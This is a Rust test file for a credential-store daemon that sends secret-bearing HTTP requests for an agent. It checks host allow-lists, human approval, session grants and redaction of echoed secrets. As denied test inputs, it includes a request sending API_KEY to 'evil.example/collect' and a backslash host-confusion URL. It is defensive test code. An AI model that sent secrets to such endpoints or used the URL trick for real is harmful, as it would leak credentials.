//! M11 acceptance: `http_request` (spec 6.6). The daemon sends the request itself, so
//! the secret never reaches a process the agent controls.
//!
//! Everything here runs without the network except `live_*`, which is `#[ignore]`d and
//! run by CI on its own (it calls a public HTTPS echo service).

use credstore::watch::{describe, show};
use credstore_proto::{
    AgentRequest, ApproverOp, ErrorCode, GrantScope, HttpHeader, HttpRequest, Injection, Response,
};
use credstore_tests::*;

/// Hosts the test secret may be sent to. `localhost:1` refuses connections, so an
/// approved request fails fast without touching the network.
const POLICY: &str = r#"
[secret.API_KEY]
network = "allow-list"
allow_hosts = ["localhost:1", "postman-echo.com", "self-signed.badssl.com"]
grant_ttl_secs = 600

[secret.NO_HOSTS]
"#;

async fn ready(tag: &str) -> TestDaemon {
    let d = TestDaemon::start(tag).await;
    d.init_vault().await;
    d.set_secret("API_KEY", FAKE).await;
    d.set_secret("NO_HOSTS", "no-hosts-fake-value").await;
    d.write_policy(POLICY);
    assert!(matches!(d.reload().await, Response::Ok));
    d
}

fn http(url: &str, secret: &str) -> HttpRequest {
    HttpRequest {
        method: "GET".into(),
        url: url.into(),
        secret: secret.into(),
        header_template: "X-Credstore-Test: Bearer {value}".into(),
        reason: "Check that credstore sends the key in a header".into(),
        headers: vec![HttpHeader {
            name: "Accept".into(),
            value: "application/json".into(),
        }],
        body: None,
        timeout_secs: Some(20),
    }
}

async fn send(d: &TestDaemon, req: HttpRequest) -> Response {
    d.client().agent(&AgentRequest::Http(req)).await.unwrap()
}

async fn send_and(d: &TestDaemon, req: HttpRequest, approve: Option<GrantScope>) -> Response {
    let (r, decided) = tokio::join!(
        send(d, req),
        d.decide_only(|request_id| match approve {
            Some(scope) => ApproverOp::Approve { request_id, scope },
            None => ApproverOp::Deny { request_id },
        })
    );
    assert!(matches!(decided, Response::Ok), "{decided:?}");
    r
}

#[tokio::test(flavor = "multi_thread")]
async fn policy_decides_where_a_secret_may_go() {
    let d = ready("m11policy").await;

    // No allow-list for the secret: never sent anywhere.
    let r = send(&d, http("https://localhost:1/", "NO_HOSTS")).await;
    assert!(denial(&r).contains("allow-list"), "{r:?}");
    // A host the secret is not allowed to reach.
    let r = send(&d, http("https://evil.example/collect", "API_KEY")).await;
    assert!(
        denial(&r).contains("may not be sent to evil.example"),
        "{r:?}"
    );
    // The right host on another port.
    let r = send(&d, http("https://postman-echo.com:8443/", "API_KEY")).await;
    assert!(denial(&r).contains("may not be sent"), "{r:?}");
    assert_eq!(d.records("policy_denied").len(), 3);
    assert_eq!(d.daemon().pending_count(), 0);

    // Malformed requests are errors, before policy.
    for (url, want) in [
        ("http://localhost:1/", "https://"),
        ("https://localhost:1\\@evil.example/", "backslashes"),
        ("https://user@localhost:1/", "user info"),
    ] {
        match send(&d, http(url, "API_KEY")).await {
            Response::Error {
                code: ErrorCode::BadRequest,
                message,
            } => assert!(message.contains(want), "{url}: {message}"),
            other => panic!("{url}: {other:?}"),
        }
    }
    // Unknown secret.
    match send(&d, http("https://localhost:1/", "MISSING")).await {
        Response::Error { message, .. } => assert!(message.contains("unknown secret")),
        other => panic!("{other:?}"),
    }
    // Commands cannot ask for header injection.
    let mut run = run_request(&[harmless_program(), "x"], &["API_KEY"], &d.work());
    run.injection = Some(Injection::Header);
    match d.run(run).await {
        Response::Error { message, .. } => assert!(message.contains("only for http_request")),
        other => panic!("{other:?}"),
    }
    assert!(d.records("http_sent").is_empty());
    d.assert_not_on_disk(FAKE);
    d.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_human_sees_the_whole_request_and_can_deny_it() {
    let d = ready("m11deny").await;
    let mut req = http("https://localhost:1/v1/charges?amount=5", "API_KEY");
    req.method = "post".into();
    req.body = Some("{\"amount\": 5}".into());

    let (r, ()) = tokio::join!(send(&d, req), async {
        d.wait_pending(1).await;
        let pending = d.pending().await.pop().unwrap();
        assert_eq!(pending.injection, Injection::Header);
        assert!(pending.argv.is_none() && pending.cwd.is_empty());
        let h = pending.http.as_ref().expect("http details");
        assert_eq!(h.method, "POST");
        assert_eq!(h.url, "https://localhost:1/v1/charges?amount=5");
        assert_eq!(h.header_template, "X-Credstore-Test: Bearer {value}");
        assert_eq!(h.body_bytes, Some(13));

        let view = describe(&pending);
        assert_eq!(view.command, "POST https://localhost:1/v1/charges?amount=5");
        let mut screen = Vec::new();
        show(&pending, &mut screen).unwrap();
        let screen = String::from_utf8(screen).unwrap();
        for want in [
            "http:     POST https://localhost:1/v1/charges?amount=5",
            "header:   X-Credstore-Test: Bearer {value}",
            "also:   Accept: application/json",
            "body:     13 bytes: {\"amount\": 5}",
            "API_KEY",
        ] {
            assert!(screen.contains(want), "{want:?} missing from:\n{screen}");
        }
        assert!(!screen.contains(FAKE));
        let resp = d
            .client()
            .approver(
                ApproverOp::Deny {
                    request_id: pending.id,
                },
                pass(),
            )
            .await
            .unwrap();
        assert!(matches!(resp, Response::Ok), "{resp:?}");
    });
    assert!(denial(&r).contains("denied by the human"), "{r:?}");
    assert!(d.records("http_sent").is_empty());
    let req = d.records("request").pop().unwrap();
    assert_eq!(req["kind"], "http");
    assert_eq!(req["headers"][0], "Accept");
    d.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn approved_requests_are_sent_and_session_grants_cover_the_same_request() {
    let d = ready("m11grant").await;
    // localhost:1 refuses the connection: the request is sent and fails, without the
    // network and without the secret in the error.
    let r = send_and(
        &d,
        http("https://localhost:1/x", "API_KEY"),
        Some(GrantScope::Session { ttl_secs: 600 }),
    )
    .await;
    match &r {
        Response::Error { message, .. } => {
            assert!(message.contains("the request failed"), "{message}");
            assert!(!message.contains(FAKE));
        }
        other => panic!("{other:?}"),
    }
    assert_eq!(d.records("http_sent").len(), 1);
    assert_eq!(d.records("http_finished").pop().unwrap()["ok"], false);

    // The same request again: covered by the grant, no human.
    let r = send(&d, http("https://localhost:1/x", "API_KEY")).await;
    assert!(matches!(r, Response::Error { .. }), "{r:?}");
    assert_eq!(d.records("approved").pop().unwrap()["via"], "grant");

    // A different URL is a different request: back to the human.
    let r = send_and(&d, http("https://localhost:1/y", "API_KEY"), None).await;
    assert!(denial(&r).contains("denied by the human"), "{r:?}");
    d.assert_not_on_disk(FAKE);
    d.stop().await;
}

/// Real HTTPS: the echo service returns the request headers, so the secret comes back
/// in the body and must arrive redacted.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs the network; CI runs it on its own"]
async fn live_the_response_is_redacted() {
    let d = ready("m11live").await;
    let r = send_and(
        &d,
        http("https://postman-echo.com/headers", "API_KEY"),
        Some(GrantScope::Once),
    )
    .await;
    let Response::HttpResult(res) = &r else {
        panic!("{r:?}");
    };
    assert_eq!(res.status, 200, "{res:?}");
    assert!(
        res.body.contains("Bearer [REDACTED:API_KEY]"),
        "the echoed header should be redacted: {}",
        res.body
    );
    assert!(!res.body.contains(FAKE));
    assert!(res.redactions >= 1);
    assert_eq!(d.records("http_finished").pop().unwrap()["status"], 200);

    // A certificate that does not verify: refused before anything is sent.
    let r = send_and(
        &d,
        http("https://self-signed.badssl.com/", "API_KEY"),
        Some(GrantScope::Once),
    )
    .await;
    match &r {
        Response::Error { message, .. } => {
            assert!(message.to_lowercase().contains("certificate"), "{message}")
        }
        other => panic!("{other:?}"),
    }
    d.assert_not_on_disk(FAKE);
    d.stop().await;
}
